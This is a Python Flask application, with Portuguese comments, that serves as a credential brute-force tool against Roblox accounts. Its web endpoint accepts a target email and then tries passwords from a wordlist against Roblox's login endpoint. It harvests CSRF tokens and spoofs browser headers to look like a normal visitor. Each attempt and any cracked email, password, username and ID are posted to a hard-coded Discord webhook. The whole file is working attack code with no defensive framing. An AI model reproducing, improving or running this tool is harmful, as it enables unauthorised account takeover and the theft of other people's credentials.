import os
import time
import requests
from bs4 import BeautifulSoup
from flask import Flask, request, jsonify
import re

app = Flask(__name__, static_folder='.')

# CONFIGURAÇÕES
WEBHOOK_URL = "https://discord.com/api/webhooks/1534375079855784046/bnLKoWanOsTF6O399cs-x-psk-RfPS84OEFe60HL-x7JrVutP4QGYow-2c4NDYKQ89DB"
ROBLOX_BASE_URL = "https://www.roblox.com"

def send_discord_message(content):
    """Envia uma mensagem para o Webhook do Discord"""
    try:
        payload = {
            "content": content,
            "username": "Roblox Brute Forcer (Python)",
            "avatar_url": 'https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg'
        }
        requests.post(WEBHOOK_URL, json=payload, timeout=10)
    except Exception as e:
        print(f"Erro no Discord: {e}")

def get_csrf_token(session):
    """Tenta extrair o token CSRF de várias formas"""
    try:
        response = session.get(f"{ROBLOX_BASE_URL}/login", timeout=10)
        response.raise_for_status()
        html = response.text
        
        # Tentativa 1: Tag meta padrão
        soup = BeautifulSoup(html, 'html.parser')
        meta_tag = soup.find('meta', attrs={'name': 'csrf-token'})
        if meta_tag:
            return meta_tag['content']
            
        # Tentativa 2: Regex para encontrar o token no HTML
        csrf_match = re.search(r'name="csrf-token" content="([^"]+)"', html)
        if csrf_match:
            return csrf_match.group(1)
            
        # Tentativa 3: Script
        script_match = re.search(r'csrfToken\s*:\s*"([^"]+)"', html)
        if script_match:
            return script_match.group(1)

        return None
    except Exception as e:
        print(f"Erro ao pegar CSRF: {e}")
        return None

def try_login(email, password):
    """Tenta fazer login no Roblox"""
    session = requests.Session()
    
    # User-Agent moderno e completo
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.9',
        'Referer': f'{ROBLOX_BASE_URL}/login',
        'Origin': 'https://www.roblox.com',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin'
    })

    # 1. Tentar pegar o Token CSRF
    csrf_token = get_csrf_token(session)
    
    # Se não tiver token, o login provavelmente vai falhar, mas tentamos
    if not csrf_token:
        return {"success": False, "error": "Token CSRF não encontrado (Bloqueio de IP provável)"}

    # 2. Preparar dados
    payload = {
        'username': email,
        'password': password
    }

    # 3. Tentar Login no endpoint correto
    try:
        # O endpoint correto é /users/login
        response = session.post(
            f"{ROBLOX_BASE_URL}/users/login",
            data=payload,
            headers={
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-CSRF-TOKEN': csrf_token,
                'X-Requested-With': 'XMLHttpRequest'
            },
            timeout=10
        )
        
        # Se der 404, o IP pode estar bloqueado pelo Cloudflare
        if response.status_code == 404:
            return {"success": False, "error": "HTTP 404 (Endpoint não encontrado ou IP Bloqueado)"}
            
        response.raise_for_status()
        data = response.json()

        if 'id' in data:
            return {
                "success": True,
                "username": data.get('username'),
                "userId": data.get('id')
            }
        else:
            error_msg = data.get('error') or data.get('message') or "Erro Desconhecido"
            return {"success": False, "error": error_msg}

    except requests.exceptions.HTTPError as e:
        status_code = response.status_code
        try:
            error_json = response.json()
            error_msg = error_json.get('error') or str(error_json)
        except:
            error_msg = str(e)
        return {"success": False, "error": f"HTTP {status_code}: {error_msg}"}
    except Exception as e:
        return {"success": False, "error": str(e)}

def start_brute_force(email):
    """Função principal"""
    try:
        with open('senhas.txt', 'r', encoding='utf-8') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        send_discord_message("**❌ ERRO:** Arquivo `senhas.txt` não encontrado!")
        return

    if not passwords:
        send_discord_message("**❌ ERRO:** Arquivo de senhas está vazio!")
        return

    send_discord_message(f"**🚀 INÍCIO DO ATAQUE (Python v3)**\n**Alvo:** {email}\n**Total de Senhas:** {len(passwords)}")

    found = False
    for password in passwords:
        if found:
            break

        result = try_login(email, password)

        if result['success']:
            found = True
            msg = (
                f"**✅ CONTA ENCONTRADA!**\n"
                f"**Email:** {email}\n"
                f"**Senha:** {password}\n"
                f"**Username:** {result['username']}\n"
                f"**ID:** {result['userId']}"
            )
            send_discord_message(msg)
        else:
            error_msg = result['error']
            msg = f"❌ **Falhou:** {password}\n**Erro:** {error_msg}"
            send_discord_message(msg)

        time.sleep(2)

    if not found:
        send_discord_message(f"**❌ ATAQUE FINALIZADO (Sem Sucesso)**\n**Alvo:** {email}\n**Senhas Testadas:** {len(passwords)}")

@app.route('/start-brute-force', methods=['POST'])
def handle_start_brute_force():
    data = request.get_json()
    email = data.get('email')

    if not email or '@' not in email:
        return jsonify({"success": False, "error": "Email inválido"}), 400

    import threading
    thread = threading.Thread(target=start_brute_force, args=(email,))
    thread.start()

    return jsonify({"success": True, "message": "Ataque iniciado!"})

@app.route('/')
def index():
    return app.send_static_file('index.html')

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
